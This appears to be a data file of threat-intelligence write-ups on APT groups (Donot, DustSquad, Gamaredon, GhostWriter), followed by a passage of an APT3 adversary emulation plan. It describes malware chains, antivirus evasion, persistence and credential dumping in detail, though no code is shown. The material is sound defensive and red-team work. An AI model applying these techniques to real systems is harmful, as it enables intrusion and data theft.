        "explain": "Donot group, also known as APT-Q-38 within QiAnXin, is believed to have a government background in a South Asian country. This group mainly conducts network espionage activities against government agencies, defense military departments, and important figures in the business field. Victims include China, Pakistan, Sri Lanka, and other South Asian countries. During the daily threat hunting process, the RedDrip Team of QiAnXin Threat Intelligence Center discovered that Donot's attack activities have maintained a high frequency since the end of last year, and this trend has continued until this year. At the end of January this year, we also captured attack samples [1] by this group using documents related to the Kashmir region as bait.After combing through the recent Donot samples we captured, we found that the group 's main attack process still maintains its usual style, but attackers are also trying different malicious code implantation methods and changing the code details of attack components. Therefore, this article will provide a brief summary of Donot's recent attack techniques. The Donot group often executes shellcode to download subsequent DLL components by carrying macros in documents. These DLLs can further download malicious components such as Trojan plugin managers and Trojan plugins. In attack samples using documents related to the Kashmir region as bait, attackers deliver downloader DLL components directly through self-extracting RAR archives. Additionally, in some attack campaigns, the Donot group also uses EXE components, which are released directly from compressed packages through macro documents, to download subsequent components.From the above, it is seen that the xls and docx class documents have the same creation time respectively, indicating that these attack samples may be generated based on the same original documents.Take the above sample (MD5: d98e2d7c8e91a9d8e87abe744f6d43f9) as an example for analysis VBA code uses a mixed case name generated with the letters ijl to obfuscate variable and function names. NtAllocateVirtualMemory is called to allocate memory. The encoded shellcode is decoded using the WideCharToMultiByte function according to the character encoding used in the document, and then the EnumUILanguages function is called to execute the shellcode. The specific shellcode executed depends on the system architecture.In the case of the 64-bit version of the shellcode, self-decryption is performed by taking the byte inverse and then XOR. APIs are imported using hash, and XOR with 0xBAADC0D3 is performed during import. The URLDownloadToCacheFileA function of the urlmon.dll module is called to download the payload, with the following URLs: The downloaded payload is loaded into memory in the same way as reading a file. The decryption operation is also performed by taking the byte inverse and then XOR, and the first byte of the decrypted data is checked for verification. If the verification passes, the decrypted data is executed. The first thing to do with the obtained second-stage shellcode is to self-decrypt by XORing the bytes, and then importing the relevant APIs. Wow64DisableWow64FsRedirection is called to disable file system redirection. GetLocalTime is used to obtain the system time. If the current time is greater than the hard-coded date, the shellcode ends its operation. As shown in the figure below, the hard-coded date is 0x7e70214, which can be decomposed into 0x07e7-0x02-0x14, and converted to decimal is 2023-02-20. Each antivirus driver file is checked in turn to see if it exists in the “C:\\Windows\\System32\\drivers” directory. If a certain antivirus driver exists, the value of the corresponding flag variable is determined based on whether the current date is greater than the corresponding built-in time data: if it is not later than the time data, it is assigned a value of 1, otherwise it is assigned a value of 2. If there is no antivirus software, URLDownloadToFileA is called to download the follow-up payload, which is saved as the Unincored.dll file in the current user's temp directory, i.e. “%tmp%\\Unincored.dll”. The URL for the follow-up is: Open the download file and modify the first 4 bytes to “4D 5A 90 00” in order to fix the PE file header. Load the DLL with LoadLibraryA and obtain the address of the specified exported function (tripoliro) with GetProcAddress, and then call the exported function. In the presence of anti-virus software, if the corresponding flag variable is 2, the shellcode will be terminated by executing the int3 interrupt or other instructions to trigger an interrupt or exception. If the flag variable is 1, the execution of the shellcode corresponding to some anti-virus software is consistent with that when there is no anti-virus software; however, when other anti-virus software is present, current shellcode will load bcrypt.dll and copy the subsequent shellcode into the memory mapped by bcrypt.dll for execution. The 32-bit version of the shellcode launched by macro code is basically the same as the 64-bit version, but the URLs for downloading subsequent shellcode and DLL payloads are different. The self-extracting file is disguised with a folder icon. After running, it is released in the temp directory. The export function of the DLL component is executed through rundll32.exe, and the folder “Kashmir” containing the compressed PDF bait document is opened. The DLL component used by the Donot group is mostly the classic three-step process of “downloader-plugin manager-plugin”, but there are also cases where the DLL component first implanted is a plugin downloader. Taking the DLL component attack process implanted by the SFX sample as an example for analysis. The DLL information used by the downloader is as follows: The downloader DLL generally has two exported functions: one exported function starts another exported function by setting a scheduled task, while the other exported function reports the collected host information to the C2 server, downloads and executes the DLL component as a plugin manager. The SFX file calls the export function StTskloipy of dn2272iosUp.dll. This function writes the current DLL file path encrypted by AES into “C:\\Users[user]\\AppData\\Local\\windin.txt”. If this DLL does not exist in the temp directory of the current user, it will be copied to the temp directory. Then, another exported function, SDtuiopnhukm, is called by setting a scheduled task through the COM interface. In addition to directly calling the COM interface, the Donot group has also used the method of releasing and executing bat files in other downloader DLLs to set scheduled tasks. The released bat file runs the schtasks command and deletes the bat file after completion. The other exported function SDtuiopnhukm of downloader dn2272iosUp.dll first creates a mutex “olgui1Pigg” to ensure single instance operation, and creates the “C:\\Users[user]\\AppData\\Local\\Nsget” directory. It collects software information installed on the local machine through the registry. It obtains the current username, computer name, and CPU identifier information through the cpuid instruction, and combines these three to form a victim ID. The victim ID is concatenated with the collected software information and ending identifier “|||S4”, and the resulting string is encrypted with AES and encoded with Base64. The encrypted data is sent to the C2 server as the “batac” parameter of a POST request. The URL for sending information back is as follows: If the C2 server responds, it requests to download the subsequent component WingMndre.dll. The name of the victim ID and the subsequent component are concatenated, encrypted, and sent as the “data” parameter of a POST request. The URL for downloading the subsequent DLL is as follows: If the download is successful, WingMndre.dll is saved in the Nsget directory created earlier. The windin.txt file released by the export function StTskloipy is deleted, and a scheduled task is set to call the export function “StConectert” of WingMndre.dll. Because this scheduled task has the same name as the one set when the export function SDtuiopnhukm (“OneDriveUpdaton”), the original task's execution content is effectively modified.A Uwn.txt file is released in the Nsget directory, its content is AES-encrypted victim ID. Then, the following formatted string is called through CreateProcessW to delete the current DLL file on the disk.The subsequent component WingMndre.dll functions works as a plugin manager, with the following basic information.The main part of the function sub_100112D0 called by the export function StConectert is a while loop. At the beginning of each iteration, it sends the victim ID as a beacon message to the C2 server. The victim ID is obtained from the file Uwn.txt under the Nsget directory, which is regenerated if the file does not exist. It is noteworthy that the AES key and IV used by the plugin manager to decrypt the content of Uwn.txt are the same as those used by the downloader component, while a different set of AES key and IV is used to encrypt the victim ID when sending the beacon message. The URL for sending the beacon message is:If a response message is received from the C2 server, the next step is executed; otherwise, it sleeps for 30 seconds and proceeds to the next iteration. The response message is separated by “|” and each part represents a specific operation for a plugin component (including the plugin manager itself). A captured response message is shown below:The format is similar to Donot's previous attack activity [2], but this time the response message is not saved as a disk file but is processed directly in memory. Each part separated by “|” is parsed and distributed to the function sub_1000FCA0 for further processing. The specific information in each part is separated by “>” and the meanings of the first four elements are as follows:The downloaded plugin components are saved in the directory “C:\\Users[user]\\AppData\\Local\\Nsget\\Updates”. The URLs for subsequent components are as follows:The command code is converted from a string to an integer using stoi and then dispatched.When updating the plugin manager, the released alex.bat is also under the Updates directory, and its content is as follows. This bat script copies the new plugin manager to the parentl directory of Updates, i.e. Nsget, deletes the original file, and deletes the scheduled task named “Windows”.Next, set up a scheduled task named “Windows” to execute the released alex.bat. Then set up another scheduled task named “WindowsMainHawk” to execute the export function StConectert of the new plugin manager. After the old plugin manager exits the while loop, just like the downloader DLL, it will perform a self-deletion operation. Function sub_1000A960 calls CreateProcessA to execute the following formatted string command.We captured a plugin named SSrtuioUpd.dll from WingMndre.dll, with the following basic information.The function of this plugin is taking screenshot and uploading, and the main logic is implemented in function sub_10006D10, with the main code as follows.Taking screenshot is accomplished by simulating the press of the printscreen key. The captured screen image is saved in the created directory “C:\\Users[user]\\AppData\\Local\\Nsget\\srt”, named with a generated GUID. The screen capture data is first saved directly to the disk with the jpg extension, and then encrypted to obtain a file with the same name but with upr extension. The original jpg file is then deleted. Then the upr file data in the srt directory is transmitted back to the C2 server, with the following URL for transmission: During the sample association process, we discovered a simpler plugin downloader DLL component, which is implanted by macro documents and shellcode. The sample information is as follows. The functions of the above two samples are consistent, so we will use the 32-bit version as an example to illustrate. The export function Rfvgyrty copies the sample itself to the created directory “C:\\Users[user]\\AppData\\Local\\Logo” with the name difg02rf.dll. A scheduled task is created to call another exported function of the copied DLL, rgbrgbbgr. The other exported function rgbrgbbgr will sequentially check whether the three plugins Kyingert.dll, tr2201dcv.dll, and SSrtfgad.dll exist in the plugin storage directory “C:\\ProgramData\\Winstom\\Dnt”. If they do not exist, they will be downloaded from the C2 server, and then the St function of the plugin DLL is called to start the plugin. The URL to obtain the plugins is as follows:Donot also uses the EXE component as a downloader to obtain the follow-up components in the attack activity. The information of related samples that have recently appeared is as follows.The VBA code in Macro Document 1 (MD5: 171c011571f94ea2f5c928bdf5d560dc) is heavily annotated. After organizing the code, it can be seen that the sample first releases pkhfg.bat, which is used to create three scheduled tasks to prepare for the execution of subsequent components. Then, it calls the gtru_fdtr function to release the dfer.cab file. Next, it releases the tbreah.bat file, which is responsible for extracting the downloader component dfer.exe from the dfer.cab file. This bat file is executed through the “fghru” scheduled task created above and deletes the task after execution. The VBA code in Macro Documents 2 and 3 is similar. Therefore, Macro Document 2 (MD5: 79cff3bc3cbe51e1b3fecd131b949930) is used as an example to illustrate. Unlike the sample mentioned above, the execution timing of the macro code has changed from “Open” to “BeforeClose.” Scheduled tasks are created directly by calling the Schedule.Service interface, and no longer by releasing bat files. After releasing the compressed file djkd.zip, it is directly decompressed the zip file in the code, and the decompressed file is renamed to the name mnvc.exe set in the scheduled task earlier. It is speculated that the attacker is trying to evade anti-virus software's scanning of the decompressed file by changing the file extension in this way.The code of the three EXE components released by the macro documents is basically the same, with simple functionality. Their role is to download two subsequent components from C2 and control the order of downloading components through a global variable with an initial value of 1. The bat file corresponds to the file path set by the VBA code above for setting up scheduled tasks. The main code is shown below. The information about the EXE components involved in the above macro documents is organized as follows. Unfortunately, we did not obtain the subsequent attack samples of the above attack. The EXE component attack activity is consistent with the Donot activity disclosed by other security vendors [3]. Since last year Donot implanted malware using the method of releasing compressed packages through macro documents and has been using EXE components in this implantation process since at least September 2022.Donot frequently uses various encryption methods to encrypt critical strings in PE-based attack components. In addition to simple addition or subtraction of fixed numerical values and single 01 transformations, we found that DLL components that have recently appeared often use double 01 transformations and custom multi-layer encryption to hide critical strings. Besides, attackers use two encryption methods to process different strings sometimes.In this type of encryption method, the ASCII code of the string is converted into binary and exists in the sample in the form of a 01 string. If this conversion is only performed once, it is a single 01 transformation. In the Donot sample that appeared at the end of 2022, double 01 transformations began to appear. The 01 string obtained after one round of transformation is transformed in the same way again, which means that each character of the original string needs to be represented by a 01 string with a length of 64 characters.In samples that use this type of encryption method, when restoring the original string, the decrypted data is decoded in base64 and decrypted in AES. Then, the decrypted data is processed in the following order: (1) subtracting 1 byte by byte, (2) swapping the positions of every two adjacent bytes, and (3) reversing the string. Overall, the attack techniques of the Donot group are relatively fixed, and a commonly used tactics in their attack chain is linking sequential components with scheduled tasks. However, the group is also expanding its attack process, with more diverse methods of implanting malicious components and using various types of components. Although there have been no reports of related attacks affecting domestic users, QiAnXin's RedDrip Team would like to remind all users not to open links of unknown origin shared on social media, click on unknown email attachments, run unknown files with exaggerated titles, or install apps from non-official sources. It is also important to regularly back up important files and update software patches. If there is a need to install an app of unknown origin, it can be first analyzed through QiAnXin Threat Intelligence Center's deep analysis platform (https://sandbox.ti.qianxin.com/sandbox/page). Currently, the deep analysis platform supports the analysis of various file formats, including those for Windows and Android platforms. Currently, all QiAnXin products based on threat intelligence data from QiAnXin Threat Intelligence Center, including TIP, Tianqing, Tianyan Advanced Threat Detection System, QiAnXin NGSOC, and QiAnXin Situational Awareness, have supported precise detection of such attacks.\n\n\n",

        "explain": "Earlier October, security experts from ESET shared details about the operations of a cyber espionage group tracked as Nomadic Octopus, a threat actor focused on diplomatic entities in Central Asia. The group has been active since at least 2015, ESET researchers presented their findings at the Virus Bulletin conference. “ESET researchers recently discovered an interesting cyber espionage campaign active in several countries of Central Asia. We attribute these attacks to a previously undocumented APT group that we have named Nomadic Octopus.” states the blog post published by Virus Bulletin. “Our findings suggest that this APT group has been active since at least 2015. The main goal of Nomadic Octopus appears to be cyber espionage against high-value targets, including diplomatic missions in the region” The experts presented their findings at the Virus Bulletin conference. Now Kaspersky experts published a detailed analysis of the attacks conducted by the group, tracked by the Russian firm as DustSquad, and the tools they used. Kaspersky is monitoring the activity of the group for the last two years, DustSquad is a Russian-language cyberespionage group particularly active in Central Asian. “For the last two years we have been monitoring a Russian-language cyberespionage actor that focuses on Central Asian users and diplomatic entities. We named the actor DustSquad and have provided private intelligence reports to our customers on four of their campaigns involving custom Android and Windows malware.” states the analysis published by Kaspersky Lab. “The name was originally coined by ESET in 2017 after the 0ct0pus3.php script used by the actor on their old C2 servers. We also started monitoring the malware and, using Kaspersky Attribution Engine based on similarity algorithms, discovered that Octopus is related to DustSquad, something we reported in April 2018. “ The group targeted the victims with spear-phishing emails, the threat actors use Russian malware filenames. Kaspersky tracked a campaign conducted by the group back to 2014 when hackers targeted entities in the former Soviet republics of Central Asia, plus Afghanistan. In April 2018, the researchers discovered a new Octopus sample developed to target Windows systems, the malicious code had been disguised as a Russian version of the Telegram app used by the Democratic Choice (DVK) opposition party in Kazakhstan. Attackers attempted to exploit the threaten of the Kazakhstan government to block Telegram over its use by the DVK.The Octopus Trojan is written in Delphi, the same programming language used by Russian-linked APT group Sofacy for the development of the Zebrocy backdoor. The malicious code backdoor features, including the ability to execute commands, upload and download files, take screenshots, and finding *.rar archives on the host. Experts noticed that even if they found malware used by both DustSquad and Sofacy APT on the compromised machines, the two cyber espionage groups are not linked. Kaspersky pointed out that many components of the Octopus malware are still unfinished, likely attackers created the malicious code in a hurry and not implemented certain features such as communication functionalities. “Political entities in Central Asia have been targeted throughout 2018 by different actors, including IndigoZebra, Sofacy (with Zebrocy malware) and most recently by DustSquad (with Octopus malware),” continues the Kaspersky report. “Interestingly, we observed some victims who are ‘threat magnets’ targeted by all of them. From our experience we can say that the interest shown by threat actors in this region is now high, and the traditional ‘players’ have been joined by relative newcomers like DustSquad that have sprung up locally.\n\n\n",

A subsequent analysis by Gcow Security in December 2019 highlighted the advanced persistent threat (APT) group's attacks against the Ministry of Foreign Affairs of Uzbekistan to deploy Octopus. Nomadic Octopus first came to light in October 2018 when ESET and Kaspersky detailed a series of phishing attacks mounted by the actor against several countries in Central Asia. The cyber offensives have involved the use of custom Android and Windows malware to strike a mix of high-value entities like local governments, diplomatic missions, and political bloggers, raising the possibility that the threat actor is likely involved in cyber surveillance operations. The intrusion set, dubbed Paperbug by Swiss cybersecurity company PRODAFT, has been attributed to a threat actor known as Nomadic Octopus (aka DustSquad). The ultimate motive behind the attacks is unclear at this stage, but the cybersecurity firm has raised the possibility that it could be the work of opposition forces within the country or, alternatively, an intelligence-gathering mission carried out by Russia or China.",

        "explain": "A computer exploit, or exploit, is an attack on a computer system, especially one that takes advantage of a particular vulnerability the system offers to intruders. Used as a verb, exploit refers to the act of successfully making such an attack. An exploit takes advantage of a weakness in an operating system, application or any other software code, including application plug-ins or software libraries. The owners of the code typically issue a fix, or patch, in response. Users of the system or application are responsible for obtaining the patch, which can usually be downloaded from the software developer on the web, or it may be downloaded automatically by the operating system or application that needs it. Failure to install a patch for a given problem exposes the user to a computer exploit and the possibility of a security breach.Security exploits come in all shapes and sizes, but some techniques are used more often than others. Some of the most common web-based security vulnerabilities include SQL injection attacks, cross-site scripting and cross-site request forgery, as well as abuse of broken authentication code or security misconfigurations. Computer exploits can be categorized in several different ways, depending on how the exploits work and what type of attacks they are able to accomplish. The most familiar type of exploit is the zero-day exploit, which takes advantage of a zero-day vulnerability. A zero-day vulnerability occurs when a piece of software -- usually an application or an operating system -- contains a critical security vulnerability of which the vendor is unaware. The vulnerability only becomes known when a hacker is detected exploiting the vulnerability, hence the term zero-day exploit. Once such an exploit occurs, systems running the software are left vulnerable to an attack until the vendor releases a patch to correct the vulnerability and the patch is applied to the software.Computer exploits can be characterized by the expected result of the attack, such as denial of service, remote code execution, privilege escalation, malware delivery or other malicious goals. Computer exploits may also be characterized by the type of vulnerability being exploited, including buffer overflow exploits, code injection or other types of input validation vulnerabilities and side-channel attacks.Although exploits can occur in a variety of ways, one common method is for exploits to be launched from malicious websites. The victim might visit such a site by accident, or they might be tricked into clicking on a link to the malicious site within a phishing email or a malicious advertisement. Malicious websites used for computer exploits may be equipped with exploit packs, software toolkits that include malicious software that can be used to unleash attacks against various browser vulnerabilities from a malicious website, or from a website that has been hacked. Such attacks usually target software coded in Java, unpatched browsers or browser plug-ins, and they are commonly used to deploy malware onto the victim's computer. Automated exploits, such as those launched by malicious websites, are often composed of two main components: the exploit code and the shell code. The exploit code is the software that attempts to exploit a known vulnerability. The shell code is the payload of the exploit -- software designed to run once the target system has been breached. The shell code gets its name from the fact that some of these payloads open a command shell that can be used to run commands against the target system; however, not all shell code actually opens a command shell.In recent years, many high-profile exploits have been used to commit massive data breaches and malware attacks. In 2016, for example, Yahoo announced a hack that had occurred years earlier had caused the data of 1 billion users to be leaked. The attackers gained access to users' email accounts because the passwords were protected by MD5, which is a weak and outdated hashing algorithm. One of the most well-known exploits in recent years is EternalBlue, which attacks a patched flaw in the Windows Server Message Block protocol. The exploit, which has been attributed to the National Security Agency, was made public by the Shadow Brokers group this year and later used by threat actors in the WannaCry and NotPetya ransomware attacks. Most recently, credit-reporting firm Equifax suffered a massive data breach after attackers exploited a critical vulnerability in the Apache Struts framework, which was used in one of the company's web applications. A patch was released earlier this year for the critical flaw, which was being exploited in the wild, but Equifax did not update its web app until after the attackers were detected.\n\n\n",

        "explain": "The Moscow-backed hacking group known as Gamaredon is ramping up its attacks on Ukraine's military and government agencies amid the country’s long-awaited counteroffensive. Ukraine's push is seen as a pivotal phase in the ongoing war. Western allies, including the U.S., are closely monitoring the country's military advancements, providing weapons to aid Kyiv's efforts. But Russia is trying to disrupt Ukraine's offensive operation both on the battlefield and in cyberspace. Gamaredon hackers, in particular, have recently stepped up their efforts against Ukrainian military organizations and government entities, according to a report published Thursday by Ukraine’s National Coordination Center for Cybersecurity (NCCC). Gamaredon operates from the Russian-annexed Crimean peninsula and acts on orders from Russia’s Federal Security Service (FSB) in Moscow. The primary objectives of its attacks are espionage and data theft, according to cybersecurity experts and government officials. In a previous report, the Ukrainian computer emergency response team (CERT-UA), said that the group has also been linked to at least one destructive cyberattack against an unspecified information infrastructure facility. Read More: GRU hacking tools targeting Ukrainian military devices detailed by Five Eyes Before Ukraine's counteroffensive began in June of this year, Gamaredon prepared its infrastructure to launch cyberattacks by registering new domains and subdomains. This infrastructure was later used to target Ukrainian military and security organizations, NCCC said. To hide its activity from targets and researchers, the group’s malware retrieves domain names from legitimate services such as Cloudflare, Telegram, and Telegraph instead of using its real IP addresses. The Ukrainian government is considering restricting the use of Telegram and Telegraph services to better detect activity from threat actors like Gamaredon, according to NCCC. Gamaredon phishing campaigns stand out due to their use of legitimate documents stolen from compromised entities. The malicious emails are often disguised as reports or official communications, according to NCCC. Gamaredon’s malware toolkit includes GammaDrop, GammaLoad, GammaSteel and LakeFlash, but it is constantly evolving. One of the group’s most distinctive malware strains is Pterodo — a multipurpose tool designed for espionage and data exfiltration. Ukrainian researchers called it “a potent threat, capable of infiltrating and compromising targeted systems with precision.” While Gamaredon is not the most technically advanced hacking group targeting Ukraine, “the growing frequency of their attacks suggest an expansion in the hacker's operational capacity and resources,” the research said. “The alignment of their activities with critical military events amplifies the group’s potential impact.”\n\n\n",

        "explain": "Researchers have published new information about a malicious campaign targeting government agencies, military organizations and civilian entities in Ukraine and Poland. From at least April 2022 until this month, hackers attempted to infiltrate victims' devices to steal information and gain permanent remote access, according to a new report released by cybersecurity firm Cisco Talos. The researchers did not disclose the extent of the impact of the attacks. Cisco Talos noted that Ukraine's computer emergency response team (CERT-UA) recently attributed the July incidents to the hacker group UNC1151, also known as GhostWriter, which has been linked to the Belarusian government. CERT-UA’s report did not include information about attacks before July. GhostWriter has targeted Ukrainian military personnel and Poland's government services before. The group mostly carries out phishing operations that steal email login credentials, compromise websites and distribute malware. In the campaign tracked by Cisco Talos, hackers used a multistage infection chain to get into their targets’ systems. First, they sent malicious Microsoft Office email attachments, mostly using Microsoft Excel and PowerPoint file formats, the researchers said These files imitated documents that appear to be sent from Ukraine's Ministry of Defense, Poland's Ministry of National Defense, and the State Treasury Service of Ukraine, among others. For instance, some of the Excel documents resemble forms used to calculate salary payments for soldiers of a specific military unit. Ukrainian and Polish businesses and general users were targeted by malicious Excel spreadsheets that masqueraded as value-added tax (VAT) return forms. The PowerPoint files would not show any actual slides when opened, but would still execute the malicious code. Researchers suggest that hackers' use of PowerPoint files indicates that they were experimenting with file formats that are less commonly used in attacks. The next stage of the attack was the deployment of downloader malware called PicassoLoader, which launches the final payloads, including the AgentTesla remote access trojan (RAT), Cobalt Strike beacons and another trojan known as njRAT. These payloads are used for information theft and remote access to infected systems, the researchers said.\n\n\n",

Palo Alto Networks linked the activity cluster to Gamaredon - a threat actor that the Ukrainian government attributed to Russia's Federal Security Service (FSB).

We would like to acknowledge the people that contributed to the content, review, and format of this document. This includes: Frank Duff, Katie Nickels, and Blake Strom. In an effort to advance the practice of security testing through adversary emulation and adversarial engineering, we present this emulation plan to be used by an adversary emulation team looking to emulate the threat group commonly known as APT3. The plan includes the group’s commonly known behavior through the tactics, techniques, and procedures (TTPs) that have been documented in publicly available threat reporting. To ground the plan in a common taxonomy, it is based on the MITRE ATT&CK model1 . The scope of this emulation plan covers the adversary lifecycle, beginning with initial network compromise and ending with exfiltration. It discusses tools, methods, style, tradecraft, and end state objectives. Historically, information about attackers’ on-target actions and goals have been difficult to obtain and APT3 reporting is no exception; however, the document bases instructions off publicly accessible sources whenever possible, focusing on sources that could be cross-referenced to some degree. To fill the intel gaps, the authors relied on their experience in threat intelligence and adversary emulation for best-estimates. Threat reporting sources vary widely, and correlation of activity to a threat group is not straightforward, and as such the authors have worked to ensure reputable sources are referenced. While many threat intelligence sources work to provide information that is as accurate as possible to the community, there is still an inherent risk that third-party threat reporting may provide inaccurate information. Note: Within this document, italicized text represents notes. These notes represent comments that are not supported by evidence but represent the author’s opinion. For example, they discuss concessions that have been made to make the emulation instructions practical or to indicate where inconsistent or nonexistent reporting has required gaps to be filled in with best-guess estimates of adversary behavior. References are indicated in-line with bracketed numbers [#] and listed at the end of this document.Adversary Objectives: Reporting indicates APT3 actors are interested in exfiltration of documents [3]. They have been known to target printers and file shares [3]. They also target intellectual property, often industrial in nature. [4]. Background: APT3 is a China-based threat group. APT3 has traditionally targeted a myriad of US and international targets; however, reporting dated September 2016 indicates the group shifted focus around March 2016 to target Hong Kong organizations [3].These phases are broken up into more detail in the following sections. The next section is about the tools that APT3 uses for their operations, how to emulate them, and what ATT&CK tactics and techniques they correspond to. Command-line examples, as well as descriptions of what the tools do, are included in the accompanying “APT3 Adversary Emulation Field Manual” for reference.APT3 uses a combination of custom and openly available tools. Because custom adversary tools can have hidden functionality, be difficult to tailor to new environments, or utilize server-side controllers which may be unavailable, recommendations are made for replacements that can accurately perform similar activity. Adversary emulators and defenders should be aware that replacement tools will typically leave different footprints than adversary tools, specifically different file hashes, command line arguments, Antivirus detection, API calls, and network signatures. There are lots of ways to accomplish the same objectives with built-in Windows tools, but the focus for APT3 tends to be on more simplistic tools rather than more advanced Windows utilities like WMIC, WinRM, and PowerShell. The following table describes how to emulate the tools as well as detailing which ATT&CK Tactics are represented by them. APT3’s custom tools provide a breadth of functionality. This section aims to break down these custom tools from the table above a bit further into their specific functions and show how they relate to ATT&CK, Windows utilities, and toolkits that are open source and commercially available. Note: The PlugX table differs from the other tables in that each row refers to a module, not function, of PlugX. Modules within PlugX leverage other PlugX modules to perform functions, for example, the Disk module allows other modules to use any of the functions it provides on the disk, such as execute, create new files, copy, delete, etc..APT3 disseminates spam-like phishing campaigns with various payload delivery methods [1]. Once on a machine, the actors collect information about the victim such as connected users [14] and analyze it for its value, trying to determine where they landed and what access they have. Admin access is an obvious main target due to the increased access it will likely provide. The actors then drop multiple backdoors, usually 2-4 on the initial system and 5+ versions within the first few hops, with independent C2 profiles for redundancy [Redundant Access – T1108]. Next they then dump as many credentials as possible, and quickly continue spreading throughout the network. They specifically go after file servers and print servers [1] [3]. Once they’re moved to all the machines they think have value, they collect all the documents they want, package them up and password protect them, and exfiltrate them out of the organization [15]. In some cases, however, they’ve been known to persist within a network for very lengthy periods without ever exfiltrating data. The sections below show how APT3 acts through their entire lifecycle. Phase 1 documents what happens during initial compromise, phase 2 highlights techniques used during network propagation, and phase 3 documents one way they have been known to perform exfiltration. The goal of the Initial Compromise phase is to achieve successful code execution and control of a system within the target environment. APT3 primarily conducts initial compromise using spear phishing, delivering implants through both malicious attachments and malicious links. They have used new 0-days on multiple browsers [15]. They have targeted existing 0-days in Internet Explorer [2], Windows [2], and Flash [14]. They have also been known to compromise weakly secured legitimate websites to which users are directed through spear phishing emails [16]. APT3 implants issue command and control (C2) traffic as HTTP GET requests that beacon at set intervals [14]. The HTTP Cookie field contains information for the C2 server, which responds with a webpage that contains the command encoded within a specific HTML tag [15]. APT3 implants have also been known to use custom binary protocols [2]. Pirpi.2014 and Pirpi.2015 both contain several kinds of sleep and anti-sandbox strategies that cause the RAT to pause between executions [15]. Some of the Pirpi instances have been known to also use SSL for their communications and even include public/private keys within the binaries [17]. This level of C2 customization can be achieved with Cobalt Strike’s malleable C2 profiles, as seen in the accompanying Malleable C2 profile modeled on [14].Many of APT3’s open source tools are customized or modified to prevent detection. Additionally, APT3’s malware uses a series of anti-disassembly techniques [3], including requiring certain command line parameters to run [17]. These are defense evasion techniques that APT3 sets up before getting initial access to the target environment. It is recommended to use anti-antivirus (AV) capabilities to prevent AV detection of commonly available tools. If Sandboxing is a problem, possibly encrypt tools to bypass sandboxing. An example of this would be Veil-Evasion [18] or Artifact Kit [19]. ATTACK techniques: T1027 – Obfuscated Files or Information, T1045 – Software Packing, T1066 – Indicator Removal from Tools.For Initial Compromise, both web server drive-by and malicious attachments are within APT3’s tradecraft. The Social Engineering Toolkit (free) [20] and Cobalt Strike (paid) [6] have features that support these methods. In late November 2014 an APT3 campaign used a spear phishing email (see Appendix A) containing a link to a malicious site. The site contained JavaScript that triggered CVE-2014-6332 (an Internet Explorer exploit [21]) which launched a VBscript and PowerShell based payload. The PowerShell script in turn downloaded and ran a stager which dropped two files, “doc.exe” and “test.exe”. “doc.exe” attempts to trigger CVE-2014-4113 (a Windows Kernel exploit [22]) and run “test.exe” with the resultant elevated privileges. “test.exe” runs two commands: In late November 2014 an APT3 campaign used a spear phishing email (see Appendix A) containing a link to a malicious site.

It contained a resume and program purported to be written by the job candidate. The program, ttcalc.exe, contained a legitimate version of TTCalc but also dropped Pirpi to:Reported in June 2014, APT3 actors sent an encrypted self-extracting RAR attachment. The RAR contained a trojanized setup program which attempts to drop and run ttcalcBAK.exe another self-extracting RAR which drops a DLL version of the PlugX RAT at: Reported in 2015, two different APT3 campaigns targeted Flash exploits, CVE-2014-1776 and CVE-2015-3113. In both cases the Flash exploit loaded the payload (the Pirpi RAT) from specially crafted GIF images. Reported in July 2015, APT3 used spear phising to direct targets to a compromised site. This site had ScanBox installed which was used to profile the victims and in some cases, deliver exploits to selected victims.The goal of the Network Propagation phase is to identify and move to desired systems within the target environment with the intention of discovering credentials and documents for exfiltration. Publicly reported direct observation of APT3’s Network Propagation techniques is almost non-existent. One report that discusses general characteristics of APT3 is [23], but it is uncertain what data sources were used to compile the listed TTPs. Aside from that report we draw conclusions of how APT3 operates based on the capabilities of Pirpi and other tools that they are reported to use. There are some persistence techniques that they have used during Initial Compromise that can be applied to Network Propagation. Despite this, there are significant gaps in the public knowledge of APT3’s tradecraft. Where necessary we fill in details with best guesses or recommendations. The process within this phase can be described with the below diagram. Each step within this phase is broken out by ATT&CK tactic and the corresponding APT3 specific techniques documented in reports. A command-line reference for emulating the specific ATT&CK techniques with built-in Windows utilities, Cobalt Strike, and Metasploit can be found in the accompanying “APT3 Adversary Emulation Field Manual”. APT3 can perform discovery with its OSInfo tool and by running built-in Windows utilities on the command-line using cmd.exe. Based on the commands available in APT3’s toolset, there is a lot of time spent enumerating domain groups with elevated permissions like “Domain Admins”, “Enterprise Admins”, and “Power Users” [T1069 - Permission Groups Discovery]. There’s also a heavy emphasis on enumerating users in these special groups with the “net user” command [T1087 – Account Discovery]. Credential dumping and persistence may require local privilege escalation if the attacker does not have control of a high integrity process; however, the only reporting available on local privilege escalation methods used by APT3 is CVE-2014-4113 [2]. It is possible that their strong reliance on credential access (detailed later) allows them to use credentials with increasing levels of access in place of other local privilege escalation mechanisms. Their perceived focus during this phase, however, is on finding credentials that allow direct admin permissions. In this case, control falls through to credential access or persistence. During an engagement, adversary emulators may find it necessary to perform local privilege escalation due to time constraints. Most common frameworks (including Metasploit and Cobalt Strike) contain some methods for privilege escalation. Also, UACBypass [24] and PowerUp [9] are common and freely available tools that may be used to perform Privilege Escalation. APT3 has used multiple methods for persistence: creating a service [23] (T1050 - New Service), creating a scheduled task [2] (T1053 - Scheduled Task), and also by placing scripts in the Startup Folder [7] [T1060 - Registry Run Keys/Start Folder]. APT3 has replaced the Sticky Keys binary (C:\\Windows\\System32\\sethc.exe) with cmd.exe [T1015 - Accessibility Features] and enabled Remote Desktop Protocol (RDP) if it is not already enabled [T1076 – Remote Desktop Protocol]. This specific Persistence technique has an added benefit of allowing an operator to open a command prompt when connected over RDP without having to provide valid credentials [23]. APT3 has been known to create or enable accounts, for example “support_388945a0”, and add them to the local admin group [23] [T1136 – Create Account]. Presumably this is done for easier future access. Recommendation: On new hosts, establish persistence by creating a service or schtasks. On systems where RDP capabilities are desired, it might also be useful to enable sticky keys and RDP. APT3 uses many forms of credential access. They used customized versions of pwdump, and later a custom compiled version of mimikatz, to search for cached Windows credentials [T1003 - Credential Dumping] as well as ChromePass and Lazagne [(T1081 - Credentials in Files], to search though browser and other credential caches. Their pwdump tool injects itself into lsass.exe and is executed by running the GetHash export of the lsremora.dll [3] Mimikatz is used to dump plaintext credentials by injecting into lsass.exe. [T1003 - Credential Dumping]. They also install a keylogger, which can be used to discover credentials and remote systems [T1056 - Input Capture]. This keylogger installs itself as a service and records keystrokes in encrypted files such as thumbcache_96.dbx [T1027 – Obfuscated Files or Information] [3]. Though publicly reported information on how APT3 enumerates machines aside 